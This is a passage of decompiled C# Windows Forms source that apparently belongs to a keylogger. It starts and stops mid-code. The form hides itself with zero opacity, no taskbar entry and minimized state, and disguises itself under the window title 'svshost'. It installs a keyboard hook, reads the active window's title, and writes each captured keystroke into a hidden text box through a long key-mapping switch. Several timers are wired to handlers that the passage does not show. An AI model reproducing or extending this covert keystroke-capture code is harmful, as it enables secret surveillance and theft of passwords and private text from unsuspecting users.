      Point point51 = point1;
      label37_1.Location = point51;
      this.Label37.Name = "Label37";
      Label label37_2 = this.Label37;
      size1 = new Size(45, 13);
      Size size51 = size1;
      label37_2.Size = size51;
      this.Label37.TabIndex = 176;
      this.Label37.Text = "Label37";
      this.ListBox1.FormattingEnabled = true;
      ListBox listBox1_1 = this.ListBox1;
      point1 = new Point(948, 8);
      Point point52 = point1;
      listBox1_1.Location = point52;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      size1 = new Size(81, 43);
      Size size52 = size1;
      listBox1_2.Size = size52;
      this.ListBox1.TabIndex = 177;
      TextBox textBox13_1 = this.TextBox13;
      point1 = new Point(891, 57);
      Point point53 = point1;
      textBox13_1.Location = point53;
      this.TextBox13.Multiline = true;
      this.TextBox13.Name = "TextBox13";
      TextBox textBox13_2 = this.TextBox13;
      size1 = new Size(100, 44);
      Size size53 = size1;
      textBox13_2.Size = size53;
      this.TextBox13.TabIndex = 179;
      this.Label39.AutoSize = true;
      Label label39_1 = this.Label39;
      point1 = new Point(635, 23);
      Point point54 = point1;
      label39_1.Location = point54;
      this.Label39.Name = "Label39";
      Label label39_2 = this.Label39;
      size1 = new Size(45, 13);
      Size size54 = size1;
      label39_2.Size = size54;
      this.Label39.TabIndex = 181;
      this.Label39.Text = "Label39";
      this.Label38.AutoSize = true;
      Label label38_1 = this.Label38;
      point1 = new Point(716, 8);
      Point point55 = point1;
      label38_1.Location = point55;
      this.Label38.Name = "Label38";
      Label label38_2 = this.Label38;
      size1 = new Size(45, 13);
      Size size55 = size1;
      label38_2.Size = size55;
      this.Label38.TabIndex = 180;
      this.Label38.Text = "Label38";
      this.Label40.AutoSize = true;
      Label label40_1 = this.Label40;
      point1 = new Point(635, 183);
      Point point56 = point1;
      label40_1.Location = point56;
      this.Label40.Name = "Label40";
      Label label40_2 = this.Label40;
      size1 = new Size(45, 13);
      Size size56 = size1;
      label40_2.Size = size56;
      this.Label40.TabIndex = 182;
      this.Label40.Text = "Label40";
      this.Label41.AutoSize = true;
      Label label41_1 = this.Label41;
      point1 = new Point(70, 88);
      Point point57 = point1;
      label41_1.Location = point57;
      this.Label41.Name = "Label41";
      Label label41_2 = this.Label41;
      size1 = new Size(45, 13);
      Size size57 = size1;
      label41_2.Size = size57;
      this.Label41.TabIndex = 183;
      this.Label41.Text = "Label41";
      this.Timer7.Interval = 1;
      TextBox textBox14_1 = this.TextBox14;
      point1 = new Point(483, 112);
      Point point58 = point1;
      textBox14_1.Location = point58;
      this.TextBox14.Multiline = true;
      this.TextBox14.Name = "TextBox14";
      TextBox textBox14_2 = this.TextBox14;
      size1 = new Size(359, 188);
      Size size58 = size1;
      textBox14_2.Size = size58;
      this.TextBox14.TabIndex = 184;
      TextBox textBox15_1 = this.TextBox15;
      point1 = new Point(359, 148);
      Point point59 = point1;
      textBox15_1.Location = point59;
      this.TextBox15.Multiline = true;
      this.TextBox15.Name = "TextBox15";
      TextBox textBox15_2 = this.TextBox15;
      size1 = new Size(257, 192);
      Size size59 = size1;
      textBox15_2.Size = size59;
      this.TextBox15.TabIndex = 185;
      TextBox textBox16_1 = this.TextBox16;
      point1 = new Point(286, 154);
      Point point60 = point1;
      textBox16_1.Location = point60;
      this.TextBox16.Multiline = true;
      this.TextBox16.Name = "TextBox16";
      TextBox textBox16_2 = this.TextBox16;
      size1 = new Size(483, 267);
      Size size60 = size1;
      textBox16_2.Size = size60;
      this.TextBox16.TabIndex = 185;
      TextBox textBox17_1 = this.TextBox17;
      point1 = new Point(565, 112);
      Point point61 = point1;
      textBox17_1.Location = point61;
      this.TextBox17.Multiline = true;
      this.TextBox17.Name = "TextBox17";
      TextBox textBox17_2 = this.TextBox17;
      size1 = new Size(162, 180);
      Size size61 = size1;
      textBox17_2.Size = size61;
      this.TextBox17.TabIndex = 186;
      this.Label42.AutoSize = true;
      Label label42_1 = this.Label42;
      point1 = new Point(114, 272);
      Point point62 = point1;
      label42_1.Location = point62;
      this.Label42.Name = "Label42";
      Label label42_2 = this.Label42;
      size1 = new Size(45, 13);
      Size size62 = size1;
      label42_2.Size = size62;
      this.Label42.TabIndex = 187;
      this.Label42.Text = "Label42";
      TextBox textBox18_1 = this.TextBox18;
      point1 = new Point(144, 320);
      Point point63 = point1;
      textBox18_1.Location = point63;
      this.TextBox18.Name = "TextBox18";
      TextBox textBox18_2 = this.TextBox18;
      size1 = new Size(100, 20);
      Size size63 = size1;
      textBox18_2.Size = size63;
      this.TextBox18.TabIndex = 190;
      TextBox textBox19_1 = this.TextBox19;
      point1 = new Point(117, 360);
      Point point64 = point1;
      textBox19_1.Location = point64;
      this.TextBox19.Name = "TextBox19";
      TextBox textBox19_2 = this.TextBox19;
      size1 = new Size(100, 20);
      Size size64 = size1;
      textBox19_2.Size = size64;
      this.TextBox19.TabIndex = 191;
      TextBox textBox20_1 = this.TextBox20;
      point1 = new Point(117, 391);
      Point point65 = point1;
      textBox20_1.Location = point65;
      this.TextBox20.Name = "TextBox20";
      TextBox textBox20_2 = this.TextBox20;
      size1 = new Size(100, 20);
      Size size65 = size1;
      textBox20_2.Size = size65;
      this.TextBox20.TabIndex = 192;
      this.TextBox20.Text = "stop";
      this.Label43.AutoSize = true;
      Label label43_1 = this.Label43;
      point1 = new Point(22, 252);
      Point point66 = point1;
      label43_1.Location = point66;
      this.Label43.Name = "Label43";
      Label label43_2 = this.Label43;
      size1 = new Size(45, 13);
      Size size66 = size1;
      label43_2.Size = size66;
      this.Label43.TabIndex = 193;
      this.Label43.Text = "Label43";
      this.Label44.AutoSize = true;
      Label label44_1 = this.Label44;
      point1 = new Point(13, 286);
      Point point67 = point1;
      label44_1.Location = point67;
      this.Label44.Name = "Label44";
      Label label44_2 = this.Label44;
      size1 = new Size(45, 13);
      Size size67 = size1;
      label44_2.Size = size67;
      this.Label44.TabIndex = 194;
      this.Label44.Text = "Label44";
      this.Label45.AutoSize = true;
      Label label45_1 = this.Label45;
      point1 = new Point(13, 313);
      Point point68 = point1;
      label45_1.Location = point68;
      this.Label45.Name = "Label45";
      Label label45_2 = this.Label45;
      size1 = new Size(45, 13);
      Size size68 = size1;
      label45_2.Size = size68;
      this.Label45.TabIndex = 195;
      this.Label45.Text = "Label45";
      this.Label46.AutoSize = true;
      Label label46_1 = this.Label46;
      point1 = new Point(22, 358);
      Point point69 = point1;
      label46_1.Location = point69;
      this.Label46.Name = "Label46";
      Label label46_2 = this.Label46;
      size1 = new Size(45, 13);
      Size size69 = size1;
      label46_2.Size = size69;
      this.Label46.TabIndex = 196;
      this.Label46.Text = "Label46";
      this.Label47.AutoSize = true;
      Label label47_1 = this.Label47;
      point1 = new Point(13, 397);
      Point point70 = point1;
      label47_1.Location = point70;
      this.Label47.Name = "Label47";
      Label label47_2 = this.Label47;
      size1 = new Size(45, 13);
      Size size70 = size1;
      label47_2.Size = size70;
      this.Label47.TabIndex = 197;
      this.Label47.Text = "Label47";
      this.Label48.AutoSize = true;
      Label label48_1 = this.Label48;
      point1 = new Point(22, 416);
      Point point71 = point1;
      label48_1.Location = point71;
      this.Label48.Name = "Label48";
      Label label48_2 = this.Label48;
      size1 = new Size(45, 13);
      Size size71 = size1;
      label48_2.Size = size71;
      this.Label48.TabIndex = 198;
      this.Label48.Text = "Label48";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(865, 485);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label48);
      this.Controls.Add((Control) this.Label47);
      this.Controls.Add((Control) this.Label46);
      this.Controls.Add((Control) this.Label45);
      this.Controls.Add((Control) this.Label44);
      this.Controls.Add((Control) this.Label43);
      this.Controls.Add((Control) this.TextBox20);
      this.Controls.Add((Control) this.TextBox19);
      this.Controls.Add((Control) this.TextBox18);
      this.Controls.Add((Control) this.Label42);
      this.Controls.Add((Control) this.TextBox17);
      this.Controls.Add((Control) this.TextBox16);
      this.Controls.Add((Control) this.TextBox15);
      this.Controls.Add((Control) this.TextBox14);
      this.Controls.Add((Control) this.Label41);
      this.Controls.Add((Control) this.Label40);
      this.Controls.Add((Control) this.Label39);
      this.Controls.Add((Control) this.Label38);
      this.Controls.Add((Control) this.TextBox13);
      this.Controls.Add((Control) this.ListBox1);
      this.Controls.Add((Control) this.Label37);
      this.Controls.Add((Control) this.TextBox11);
      this.Controls.Add((Control) this.lblNumb);
      this.Controls.Add((Control) this.Label36);
      this.Controls.Add((Control) this.Label35);
      this.Controls.Add((Control) this.TextBox10);
      this.Controls.Add((Control) this.TextBox9);
      this.Controls.Add((Control) this.TextBox8);
      this.Controls.Add((Control) this.TextBox7);
      this.Controls.Add((Control) this.TextBox6);
      this.Controls.Add((Control) this.Label34);
      this.Controls.Add((Control) this.TextBox5);
      this.Controls.Add((Control) this.Label33);
      this.Controls.Add((Control) this.Label32);
      this.Controls.Add((Control) this.Label31);
      this.Controls.Add((Control) this.Label30);
      this.Controls.Add((Control) this.Label29);
      this.Controls.Add((Control) this.Label28);
      this.Controls.Add((Control) this.Label27);
      this.Controls.Add((Control) this.Label26);
      this.Controls.Add((Control) this.Label25);
      this.Controls.Add((Control) this.Label24);
      this.Controls.Add((Control) this.Label23);
      this.Controls.Add((Control) this.Label22);
      this.Controls.Add((Control) this.Label21);
      this.Controls.Add((Control) this.Label20);
      this.Controls.Add((Control) this.Label19);
      this.Controls.Add((Control) this.Label18);
      this.Controls.Add((Control) this.Label17);
      this.Controls.Add((Control) this.Label16);
      this.Controls.Add((Control) this.Label15);
      this.Controls.Add((Control) this.Label14);
      this.Controls.Add((Control) this.Label13);
      this.Controls.Add((Control) this.Label12);
      this.Controls.Add((Control) this.Label11);
      this.Controls.Add((Control) this.Label10);
      this.Controls.Add((Control) this.Label9);
      this.Controls.Add((Control) this.Label8);
      this.Controls.Add((Control) this.Label7);
      this.Controls.Add((Control) this.Label6);
      this.Controls.Add((Control) this.Label5);
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.TextBox12);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "svshost";
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox4
    {
      get => this._TextBox4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual TextBox TextBox3
    {
      get => this._TextBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual TextBox TextBox2
    {
      get => this._TextBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox1
    {
      get => this._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual Label Label3
    {
      get => this._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label3 = value;
    }

    internal virtual Label Label4
    {
      get => this._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label4 = value;
    }

    internal virtual Label Label5
    {
      get => this._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label5 = value;
    }

    internal virtual Label Label6
    {
      get => this._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label6 = value;
    }

    internal virtual Label Label7
    {
      get => this._Label7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label7 = value;
    }

    internal virtual Label Label8
    {
      get => this._Label8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label8 = value;
    }

    internal virtual Label Label9
    {
      get => this._Label9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label9 = value;
    }

    internal virtual Label Label10
    {
      get => this._Label10;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label10 = value;
    }

    internal virtual Label Label11
    {
      get => this._Label11;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label11 = value;
    }

    internal virtual Label Label12
    {
      get => this._Label12;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label12 = value;
    }

    internal virtual Label Label13
    {
      get => this._Label13;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label13 = value;
    }

    internal virtual Label Label14
    {
      get => this._Label14;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label14_Click);
        if (this._Label14 != null)
          this._Label14.Click -= eventHandler;
        this._Label14 = value;
        if (this._Label14 == null)
          return;
        this._Label14.Click += eventHandler;
      }
    }

    internal virtual Label Label15
    {
      get => this._Label15;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label15 = value;
    }

    internal virtual Label Label16
    {
      get => this._Label16;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label16 = value;
    }

    internal virtual Label Label17
    {
      get => this._Label17;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label17 = value;
    }

    internal virtual Label Label18
    {
      get => this._Label18;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label18 = value;
    }

    internal virtual Label Label19
    {
      get => this._Label19;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label19 = value;
    }

    internal virtual Label Label20
    {
      get => this._Label20;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label20 = value;
    }

    internal virtual Label Label21
    {
      get => this._Label21;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label21 = value;
    }

    internal virtual Label Label22
    {
      get => this._Label22;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label22 = value;
    }

    internal virtual Label Label23
    {
      get => this._Label23;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label23 = value;
    }

    internal virtual Label Label24
    {
      get => this._Label24;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label24 = value;
    }

    internal virtual Label Label25
    {
      get => this._Label25;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label25 = value;
    }

    internal virtual Label Label26
    {
      get => this._Label26;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label26 = value;
    }

    internal virtual Label Label27
    {
      get => this._Label27;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label27 = value;
    }

    internal virtual Label Label28
    {
      get => this._Label28;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label28 = value;
    }

    internal virtual Label Label29
    {
      get => this._Label29;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label29 = value;
    }

    internal virtual Label Label30
    {
      get => this._Label30;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label30 = value;
    }

    internal virtual Label Label31
    {
      get => this._Label31;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label31 = value;
    }

    internal virtual Label Label32
    {
      get => this._Label32;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label32 = value;
    }

    internal virtual Label Label33
    {
      get => this._Label33;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label33 = value;
    }

    internal virtual TextBox TextBox5
    {
      get => this._TextBox5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox5 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      get => this._Timer2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      get => this._Timer3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual Label Label34
    {
      get => this._Label34;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label34 = value;
    }

    internal virtual TextBox TextBox6
    {
      get => this._TextBox6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox6 = value;
    }

    internal virtual TextBox TextBox7
    {
      get => this._TextBox7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox7 = value;
    }

    internal virtual TextBox TextBox8
    {
      get => this._TextBox8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox8 = value;
    }

    internal virtual TextBox TextBox9
    {
      get => this._TextBox9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox9 = value;
    }

    internal virtual TextBox TextBox10
    {
      get => this._TextBox10;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox10 = value;
    }

    internal virtual Label Label36
    {
      get => this._Label36;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label36 = value;
    }

    internal virtual Label Label35
    {
      get => this._Label35;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label35 = value;
    }

    internal virtual Label lblNumb
    {
      get => this._lblNumb;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._lblNumb = value;
    }

    internal virtual TextBox TextBox11
    {
      get => this._TextBox11;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox11 = value;
    }

    internal virtual TextBox TextBox12
    {
      get => this._TextBox12;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox12 = value;
    }

    internal virtual Label Label37
    {
      get => this._Label37;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label37 = value;
    }

    internal virtual ListBox ListBox1
    {
      get => this._ListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer5
    {
      get => this._Timer5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer5_Tick);
        if (this._Timer5 != null)
          this._Timer5.Tick -= eventHandler;
        this._Timer5 = value;
        if (this._Timer5 == null)
          return;
        this._Timer5.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox13
    {
      get => this._TextBox13;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox13 = value;
    }

    internal virtual Label Label39
    {
      get => this._Label39;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label39 = value;
    }

    internal virtual Label Label38
    {
      get => this._Label38;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label38 = value;
    }

    internal virtual Label Label40
    {
      get => this._Label40;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label40 = value;
    }

    internal virtual Label Label41
    {
      get => this._Label41;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label41 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      get => this._Timer4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
        if (this._Timer4 != null)
          this._Timer4.Tick -= eventHandler;
        this._Timer4 = value;
        if (this._Timer4 == null)
          return;
        this._Timer4.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer6
    {
      get => this._Timer6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer6_Tick);
        if (this._Timer6 != null)
          this._Timer6.Tick -= eventHandler;
        this._Timer6 = value;
        if (this._Timer6 == null)
          return;
        this._Timer6.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer7
    {
      get => this._Timer7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer7_Tick);
        if (this._Timer7 != null)
          this._Timer7.Tick -= eventHandler;
        this._Timer7 = value;
        if (this._Timer7 == null)
          return;
        this._Timer7.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox14
    {
      get => this._TextBox14;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox14 = value;
    }

    internal virtual TextBox TextBox15
    {
      get => this._TextBox15;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox15 = value;
    }

    internal virtual TextBox TextBox16
    {
      get => this._TextBox16;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox16 = value;
    }

    internal virtual TextBox TextBox17
    {
      get => this._TextBox17;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox17 = value;
    }

    internal virtual Label Label42
    {
      get => this._Label42;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label42 = value;
    }

    internal virtual TextBox TextBox18
    {
      get => this._TextBox18;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox18 = value;
    }

    internal virtual TextBox TextBox19
    {
      get => this._TextBox19;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox19 = value;
    }

    internal virtual TextBox TextBox20
    {
      get => this._TextBox20;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox20 = value;
    }

    internal virtual Label Label43
    {
      get => this._Label43;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label43 = value;
    }

    internal virtual Label Label44
    {
      get => this._Label44;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label44 = value;
    }

    internal virtual Label Label45
    {
      get => this._Label45;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label45 = value;
    }

    internal virtual Label Label46
    {
      get => this._Label46;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label46 = value;
    }

    internal virtual Label Label47
    {
      get => this._Label47;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label47 = value;
    }

    internal virtual Label Label48
    {
      get => this._Label48;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label48 = value;
    }

    private virtual Form1.KeyboardHook kbHook
    {
      get => this._kbHook;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Form1.KeyboardHook.KeyDownEventHandler downEventHandler = new Form1.KeyboardHook.KeyDownEventHandler(this.shiftandcaps);
        if (this._kbHook != null)
          Form1.KeyboardHook.KeyDown -= downEventHandler;
        this._kbHook = value;
        if (this._kbHook == null)
          return;
        Form1.KeyboardHook.KeyDown += downEventHandler;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Microsoft.VisualBasic.Strings.InStr(lpString, "\0") - 1));
    }

    public void shiftandcaps(Keys Key)
    {
      if (!MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "a";
            break;
          case Keys.B:
            this.TextBox1.Text += "b";
            break;
          case Keys.C:
            this.TextBox1.Text += "c";
            break;
          case Keys.D:
            this.TextBox1.Text += "d";
            break;
          case Keys.E:
            this.TextBox1.Text += "e";
            break;
          case Keys.F:
            this.TextBox1.Text += "f";
            break;
          case Keys.G:
            this.TextBox1.Text += "g";
            break;
          case Keys.H:
            this.TextBox1.Text += "h";
            break;
          case Keys.I:
            this.TextBox1.Text += "i";
            break;
          case Keys.J:
            this.TextBox1.Text += "j";
            break;
          case Keys.K:
            this.TextBox1.Text += "k";
            break;
          case Keys.L:
            this.TextBox1.Text += "l";
            break;
          case Keys.M:
            this.TextBox1.Text += "m";
            break;
          case Keys.N:
            this.TextBox1.Text += "n";
            break;
          case Keys.O:
            this.TextBox1.Text += "o";
            break;
          case Keys.P:
            this.TextBox1.Text += "p";
            break;
          case Keys.Q:
            this.TextBox1.Text += "q";
            break;
          case Keys.R:
            this.TextBox1.Text += "r";
            break;
          case Keys.S:
            this.TextBox1.Text += "s";
            break;
          case Keys.T:
            this.TextBox1.Text += "t";
            break;
          case Keys.U:
            this.TextBox1.Text += "u";
            break;
          case Keys.V:
            this.TextBox1.Text += "v";
            break;
          case Keys.W:
            this.TextBox1.Text += "w";
            break;
          case Keys.X:
            this.TextBox1.Text += "x";
            break;
          case Keys.Y:
            this.TextBox1.Text += "y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "z";
            break;
          case Keys.NumPad0:
            this.TextBox1.Text += "0";
            break;
          case Keys.NumPad1:
            this.TextBox1.Text += "1";
            break;
          case Keys.NumPad2:
            this.TextBox1.Text += "2";
            break;
          case Keys.NumPad3:
            this.TextBox1.Text += "3";
            break;
          case Keys.NumPad4:
            this.TextBox1.Text += "4";
            break;
          case Keys.NumPad5:
            this.TextBox1.Text += "5";
            break;
          case Keys.NumPad6:
            this.TextBox1.Text += "6";
            break;
          case Keys.NumPad7:
            this.TextBox1.Text += "7";
            break;
          case Keys.NumPad8:
            this.TextBox1.Text += "8";
            break;
          case Keys.NumPad9:
            this.TextBox1.Text += "9";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text += "[DEL]";
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
